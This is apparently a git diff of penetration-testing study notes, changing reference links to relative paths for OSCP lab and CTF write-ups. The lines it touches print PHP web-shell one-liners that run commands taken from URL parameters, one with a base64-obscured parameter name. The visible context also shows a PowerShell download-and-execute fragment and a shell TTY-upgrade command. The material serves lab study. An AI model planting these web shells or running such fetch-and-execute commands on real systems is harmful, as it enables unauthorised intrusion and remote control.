@@ -149,9 +149,9 @@ To run in a PHP file: change `php -r '$COMMAND_BLOCK'` to `<?php $COMMAND_BLOCK 
 
 |   |   |
 |---|---|
-|`<?php echo passthru($_GET['k']);?>`|<https://github.com/joetanx/oscp/blob/main/practice/itsl/2021-10-24-Dealer313.md>|
-|`<?php system($_GET[base64_decode('Y21k')]);?>`|<https://github.com/joetanx/oscp/blob/main/practice/itsl/2022-01-17-Vulndc2.md>|
-|`<?php echo passthru($_GET['cmd']); ?>`|<https://github.com/joetanx/oscp/blob/main/practice/vulnhub/digitalworld.local-joy.md>|
+|`<?php echo passthru($_GET['k']);?>`|[Used in: ITSL:Dealer 313](/practice/itsl/2021-10-24-Dealer313.md)|
+|`<?php system($_GET[base64_decode('Y21k')]);?>`|[Used in: ITSL: VulnDC2](/practice/itsl/2022-01-17-Vulndc2.md)|
+|`<?php echo passthru($_GET['cmd']); ?>`|[Used in: digitalworld.local:JOY](/practice/vulnhub/digitalworld.local-joy.md)|
 
 ### 3.3. Payloads
 
@@ -230,7 +230,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Ne
 
 ### 3.6. Upgrade to Full TTY
 
-[Used in: digitalworld.local:JOY](https://github.com/joetanx/oscp/blob/main/practice/vulnhub/digitalworld.local-joy.md)
+[Used in: digitalworld.local:JOY](/practice/vulnhub/digitalworld.local-joy.md)
 
 ```console
 python -c 'import pty;pty.spawn("/bin/bash")'
